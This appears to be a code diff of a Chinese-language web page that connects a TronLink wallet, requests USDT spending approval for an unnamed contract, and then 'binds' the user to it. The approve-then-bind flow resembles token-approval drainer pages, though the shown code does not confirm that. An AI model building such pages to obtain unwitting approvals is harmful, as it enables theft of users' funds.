@@ -219,14 +219,12 @@
     async function connectWallet() {
         setStatus("⏳ 检测钱包...", true);
         
-        // 检查 TronLink 是否可用
         if (!window.tronLink && !window.tronWeb) {
             setStatus("❌ 未检测到 TronLink 钱包，请使用 TronLink App 打开", false);
             return;
         }
 
         try {
-            // 获取 tronWeb 实例
             if (window.tronLink && window.tronLink.tronWeb) {
                 tronWeb = window.tronLink.tronWeb;
             } else if (window.tronWeb) {
@@ -236,18 +234,15 @@
                 return;
             }
 
-            // 等待 ready
             if (tronWeb && tronWeb.ready) {
                 await tronWeb.ready;
             }
 
-            // 获取用户地址 - 最简方式
             if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                 userAddress = tronWeb.defaultAddress.base58;
             } else if (tronWeb.defaultAddress && typeof tronWeb.defaultAddress === 'string') {
                 userAddress = tronWeb.defaultAddress;
             } else if (window.tronLink && window.tronLink.request) {
-                // 尝试通过 request 获取
                 const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
                 if (result && result.length > 0) {
                     userAddress = result[0];
@@ -259,11 +254,9 @@
                 return;
             }
             
-            // 更新 UI
             walletRow.style.display = 'flex';
             walletAddressSpan.innerText = userAddress;
             
-            // 初始化合约
             try {
                 usdtContract = await tronWeb.contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
                 myContract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
@@ -272,7 +265,6 @@
                 return;
             }
             
-            // 显示连接成功（截取前8位后6位）
             const shortAddr = userAddress.length > 14 ? 
                 `${userAddress.substring(0, 8)}...${userAddress.substring(userAddress.length - 6)}` : 
                 userAddress;
@@ -320,21 +312,41 @@
         }
     }
 
+    // ========== 修复后的授权函数 ==========
     async function approveUSDT() {
-        if (!tronWeb || !usdtContract || !userAddress) {
-            setStatus('❌ 请先连接钱包', false);
+        // 检查并重新获取地址
+        let currentAddress = userAddress;
+        
+        if (!currentAddress && tronWeb && tronWeb.defaultAddress) {
+            if (tronWeb.defaultAddress.base58) {
+                currentAddress = tronWeb.defaultAddress.base58;
+            } else if (typeof tronWeb.defaultAddress === 'string') {
+                currentAddress = tronWeb.defaultAddress;
+            }
+        }
+        
+        if (!currentAddress) {
+            setStatus('❌ 未获取到钱包地址，请重新连接钱包', false);
             return;
         }
+        
+        if (!usdtContract) {
+            setStatus('❌ 合约未初始化，请重新连接钱包', false);
+            return;
+        }
+        
         try {
             setStatus('⏳ 发起授权请求，请在钱包中确认...', true);
             approveBtn.disabled = true;
+            
             const result = await usdtContract.approve(CONTRACT_ADDRESS, APPROVE_AMOUNT).send({
                 feeLimit: 150_000_000
             });
+            
             setStatus(`✅ 授权成功！Tx: ${result.substring(0, 10)}...`, false);
             await checkAllowance();
         } catch (error) {
-            console.error(error);
+            console.error("授权错误:", error);
             setStatus(`❌ 授权失败: ${error.message || error}`, false);
         } finally {
             approveBtn.disabled = false;
@@ -347,7 +359,6 @@
             return;
         }
         try {
-            // 先检查授权
             const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS).call();
             if (tronWeb.toBigNumber(allowance).lt(tronWeb.toBigNumber(APPROVE_AMOUNT))) {
                 setStatus('❌ 请先完成授权，再绑定', false);
@@ -371,7 +382,7 @@
     bindBtn.addEventListener('click', bindContract);
 
     setStatus('✅ 准备就绪，点击「连接钱包」开始', false);
- </script>
+</script>
 
 
 </body>
